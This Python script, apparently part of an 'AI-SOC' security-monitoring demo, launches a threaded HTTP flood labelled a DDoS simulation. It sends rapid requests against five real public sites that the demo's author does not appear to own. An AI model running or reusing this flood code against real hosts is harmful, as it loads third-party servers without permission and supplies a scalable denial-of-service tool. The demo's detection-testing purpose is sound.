import threading
import time
import sys
import urllib.request
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent.parent))
from utils.logger import get_logger

log = get_logger(__name__)

# Multiple targets to distribute the flood across real endpoints
TARGETS = [
    "http://example.com",
    "http://httpbin.org/get",
    "http://neverssl.com",
    "http://example.org",
    "http://info.cern.ch",
]

def run(requests_count=200):
    print("\n=======================================================")
    print("   AI-SOC Demo: HTTP DDoS Flood Attack")
    print("=======================================================\n")
    log.warning(f"🔴 [ATTACK] Launching HTTP Flood ({requests_count} requests across {len(TARGETS)} targets)...")
    
    completed = [0]
    failed = [0]
    
    def send_req(url):
        try:
            req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0 DDoS-Sim'})
            with urllib.request.urlopen(req, timeout=3) as resp:
                resp.read(512)  # Read a small chunk to complete the flow
            completed[0] += 1
        except Exception:
            failed[0] += 1

    threads = []
    for i in range(requests_count):
        url = TARGETS[i % len(TARGETS)]
        t = threading.Thread(target=send_req, args=(url,))
        threads.append(t)
        t.start()
        # Small stagger to avoid OS socket exhaustion but still fast enough for DDoS pattern
        time.sleep(0.02)

    for t in threads:
        t.join()
        
    log.info(f"✅ HTTP Flood complete. {completed[0]} succeeded, {failed[0]} failed.")

if __name__ == "__main__":
    run()
